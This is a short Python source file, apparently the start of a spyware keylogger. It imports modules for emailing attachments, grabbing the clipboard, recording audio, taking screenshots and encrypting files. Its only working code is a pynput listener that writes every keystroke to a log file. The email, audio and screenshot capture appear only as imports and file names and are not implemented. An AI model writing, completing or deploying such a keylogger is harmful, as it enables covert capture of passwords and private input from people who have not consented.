# Libraries

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import clipboard # Using clipboard instead of win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

system_information = "system.txt"
audio_information = "audio.wav"
clipboard_information = "clipboard.txt"
screenshot_information = "screenshot.png"
keys_information = "key_log.txt"

system_information_enc = 'enc_system.txt'
clipboard_information_enc = 'enc_clipboard.txt'
keys_information_enc = 'enc_keys_logged.txt'

def on_press_func(key):
    try:
        if(key == Key.shift_r):
            listener.stop()
        else:
            f.write(key.char)
    except AttributeError:
        f.write('(' + str(key) + ')')


f = open(keys_information, 'a')

with Listener(
        on_press=on_press_func) as listener:
    listener.join()

f.close()
